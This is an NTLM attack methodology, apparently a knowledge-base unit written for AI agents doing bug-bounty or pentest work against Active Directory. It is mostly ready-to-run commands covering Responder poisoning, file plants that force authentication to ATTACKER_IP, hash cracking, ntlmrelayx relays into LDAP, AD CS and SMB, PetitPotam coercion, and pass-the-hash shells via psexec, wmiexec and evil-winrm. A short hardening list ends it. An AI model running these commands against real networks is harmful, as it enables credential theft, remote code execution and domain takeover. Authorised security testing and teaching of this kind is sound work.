---
technology: "NTLM"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
provenance: "corpus-mined (38 machines) + upstream-verified: [MS-NLMP] protocol page (v38.0), impacket ntlmrelayx.py source (server families, stopping conditions), Responder README (poisoners, rogue services, -m 7500 Kerberos capture, analyze mode), PetitPotam README (MS-EFSRC, CVE-2021-36942, no-creds-vs-DC), hashcat v8 example table (5600/5500/7500/1000). Signing-context family (netexec probe lines) observed in 42 files. Lab-safe placeholders (ATTACKER_IP, 198.51.100.x, example.com). Verified 2026-11-12."
---

# NTLM bug bounty methodology

Target model: internal segment 198.51.100.0/24, DC dc01.example.com
(198.51.100.10), attacker at ATTACKER_IP. Foothold: none needed for capture;
network position + one credential for relay tooling. Companion overview:
[[ntlm|NTLM]]. Cross-units: relay-to-CA in [[ad-cs]], relay-to-LDAP rights in
[[ad-acl]]/[[ldap-ad]], kerberos fallback in [[kerberos]], hash sources in
[[ntds]]/[[windows-secrets]].

## Triage table

| Surface | Gate | Min privilege | Payoff |
|---|---|---|---|
| Responder poisoning | LLMNR/NBT-NS/mDNS live | network position | NetNTLMv1/v2 hashes (crack) |
| Forced-auth plants (.scf/.lnk/UNC) | writable share or SQL exec | that access | hash from a specific user |
| NetNTLMv2 crack | hash in hand + wordlist | offline | plaintext password |
| NetNTLMv1 (fixed challenge) | downgrade client + crack infra | rogue server | mass plaintext |
| Relay → SMB | target signing off | coerced/relayed auth | exec/shares as victim |
| Relay → LDAP | base [[ad-acl]] writes reachable | coerced machine auth | RBCD/ACL abuse |
| Relay → HTTP (AD CS) | certsrv over HTTP (ESC8) | coerced auth | cert as victim |
| Pass-the-hash | NT hash (from [[ntds]] etc.) | hash possession | direct auth |
| SOCKS session park | any successful relay | relay live | menu of victim sessions |

Phase order: 0 posture audit → 1 capture → 2 crack → 3 coerce+relay → 4
target-specific abuse → 5 PTH.

## Phase 0 — Posture audit (what lanes exist)

```bash
nxc smb 198.51.100.0/24 --gen-relay-list targets.txt   # hosts with signing:False
nxc smb 198.51.100.10 -u 'guest' -p ''                 # probe line: (signing:True/False)
responder -I tun0 -A                                   # analyze mode: passive, poison-free look
#                                                        at how much LLMNR/NBT-NS traffic exists
```

Reading it: every `signing:False` host is an SMB relay lane; DCs default to
required signing (probe shows True) — do not plan SMB relay at them. LDAP relay
works when the DC allows unsigned/simple binds (see [[ldap]] ADV190023 notes).
HTTP relay needs the endpoint to accept NTLM without EPA — the classic is AD CS
web enrollment.

## Phase 1 — Capture (Responder)

```bash
# tune the challenge for v1 crackability (edit Responder.conf when needed)
#   [Challenge] 1122334455667788
sudo responder -I tun0 -v                    # SMB+HTTP poisoners + rogue servers
# craft the plant when you need a SPECIFIC user (observed pattern):
#   .scf/.lnk with icon path \\\\ATTACKER_IP\\share\\x.ico  on a browsed share
```

Expected output lines:
`[SMB] NTLMv2-SSP Client : …, DOMAIN\user : 1122… : <response>` — crackable, NOT
passable. Kerberos-fallback clients hand you AS-REQ hashes → `hashcat -m 7500`.

## Phase 2 — Crack

```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2
hashcat -m 5500 netntlmv1.txt …                                  # NetNTLMv1/+ESS — rainbow-table tier
john --format=netntlmv2 --wordlist=… hash
```

Decision point: crack fails on strong passwords → the hash was never the goal;
pivot to Phase 3 (relay works without knowing the password).

## Phase 3 — Coerce + relay

```bash
# listener first: relay SMB auth into LDAP with a computer-account add (RBCD setup)
impacket-ntlmrelayx -t ldap://198.51.100.10 --delegate-access --remove-mic \
  -smb2support                    # add --delegate-access for delegation-abuse chains
# or into the CA's web enrollment (full chain in [[ad-cs]]):
impacket-ntlmrelayx -t http://198.51.100.20/certsrv/ -smb2support
# or plain exec on a signing-off host:
impacket-ntlmrelayx -tf targets.txt -smb2support                # targets.txt = signing:False hosts

# then coerce a machine (PetitPotam — MS-EFSRC; no creds needed against a DC):
python3 PetitPotam.py ATTACKER_IP 198.51.100.10     # CVE-2021-36942 was an incomplete fix
# humans coerce via plants from Phase 1 (do NOT run responder poisoners on the relay ports:
#   disable SMB/HTTP in Responder.conf so the relay owns those ports)
```

ntlmrelayx server families (source-verified): SMB, HTTP, WCF, RAW, RPC, WinRM,
WinRMS, MSSQL, RDP — target URLs select the client. `-socks` parks sessions into
an interactive menu (field-observed), `-wh`/`-w` for wpad-style augmentation,
`-6` for IPv6/DHCPv6 lanes.

Decision points per target: SMB → signing check (Phase 0); LDAP → plain LDAP
only (LDAPS breaks relay absent channel-binding gaps) and the useful writes are
[[ad-acl]] primitives; MSSQL → `--q` query exec; WinRM → command exec; HTTP →
endpoint-specific ([[ad-cs]] for certsrv). Cross-ref: what relayed-LDAP rights
buy is [[kerberos]] RBCD — the two units share the escalation.

## Phase 4 — Target-specific abuse (pointers)

- LDAP relay + `--delegate-access` → new machine account + RBCD write → S4U
  impersonation ([[kerberos]], [[ad-acl]]).
- certsrv relay → cert as victim → PKINIT → their NT hash ([[ad-cs]]; includes a Kerberos-relay variant).
- SMB relay to signing-off host → SAM/LSA dump of that host ([[windows-secrets]])
  or service exec.

## Phase 5 — Pass-the-hash (when you hold the NT hash)

```bash
impacket-psexec    -hashes :31d6fe0d16ae931b73c59d7c0e089c0f example.com/administrator@198.51.100.10
impacket-wmiexec  -hashes :31d6…0f example.com/administrator@198.51.100.10
evil-winrm -i 198.51.100.10 -u administrator -H 31d6fe0d16ae931b73c59d7c0e089c0f   # field-observed
nxc smb 198.51.100.10 -u administrator -H 31d6…0f --local-auth
```

PTH is NTLM-specific: the hash rides SESSION SETUP (or Kerberos RC4 where
allowed — an observed engagement notes the getTGT-with-hash Kerberos form; see
[[kerberos]] overpass-the-hash). Works for local SAM hashes
([[windows-secrets]]) and DIT hashes ([[ntds]]) alike.

## Hardening read-back (what kills each phase)

- Phase 1/2 die with LLMNR/NBT-NS disabled by GPO + SMB signing required.
- Phase 3 dies with signing everywhere, LDAPS channel-binding enforced
  (ADV190023), EPA on HTTP endpoints (KB5005413), and EFSRPC hardening.
- Phase 5 survives everything except NTLM removal — the eventual answer is
  Kerberos-only estates ([[kerberos]]).

## Tool map (prose)

Responder (poisoning + rogue servers + analyze mode), impacket ntlmrelayx
(relay framework), PetitPotam and Coercer (MS-EFSRC/MS-RPRN coercion), netexec
/ crackmapexec (posture probe + PTH validation), hashcat modes 5600/5500/7500
(capture crack) and 1000 (raw NT), evil-winrm (WinRM PTH shell), impacket
psexec/wmiexec/atexec/smbexec (PTH exec family), xurl-style .scf/.lnk plants
are hand-rolled. BloodHound (via [[ldap-ad]]) maps who the relayed identity can
escalate through.
